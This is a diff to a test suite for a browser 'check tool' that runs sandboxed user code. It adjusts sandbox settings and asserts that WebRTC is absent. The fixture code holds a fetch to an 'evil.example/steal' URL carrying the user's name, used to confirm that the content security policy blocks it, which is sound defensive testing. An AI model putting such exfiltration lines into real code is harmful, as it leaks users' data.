@@ -166,7 +166,13 @@ describe("check tool in a real browser", { skip }, () => {
 
   before(async () => {
     t = await startApp();
-    checker = new BrowserChecker(t.cfg.platformOrigin);
+    // Chromium's sandbox can't start as root (as in CI containers); everywhere else, test with it on.
+    checker = new BrowserChecker({
+      platformOrigin: t.cfg.platformOrigin,
+      houseScheme: t.cfg.houseScheme,
+      houseDomain: t.cfg.houseDomain,
+      sandbox: process.getuid?.() !== 0,
+    });
     owner = new Client(t);
     await owner.signup("checker_cat");
     houseId = await owner.createHouse("Check Me");
@@ -195,7 +201,7 @@ describe("check tool in a real browser", { skip }, () => {
     const fs = await import("node:fs/promises");
     await fs.writeFile(
       `${dir}/app.js`,
-      `const house = await House.ready;\nfetch("https://evil.example/steal?d=" + house.me.name).catch(() => {});\nnull.boom();\n`,
+      `const house = await House.ready;\nconsole.error("rtc:" + typeof RTCPeerConnection);\nfetch("https://evil.example/steal?d=" + house.me.name).catch(() => {});\nnull.boom();\n`,
     );
     const sha = await svc.repos.commitWorktree(houseId, runId, "broken", { name: "t", email: "t@t.invalid" });
     const url = await svc.houses.frameUrl(houseId, sha);
@@ -203,6 +209,8 @@ describe("check tool in a real browser", { skip }, () => {
     assert.equal(r.connected, true);
     assert.ok(r.errors.some((e) => /null|boom|Cannot read/.test(e)), JSON.stringify(r.errors));
     assert.ok(r.blocked.some((b) => /evil\.example/.test(b)), JSON.stringify(r.blocked));
+    // House code under test has no WebRTC, the one network path CSP can't close.
+    assert.ok(r.console.includes("rtc:undefined"), JSON.stringify(r.console));
     await svc.repos.removeWorktree(houseId, runId);
   });
 });
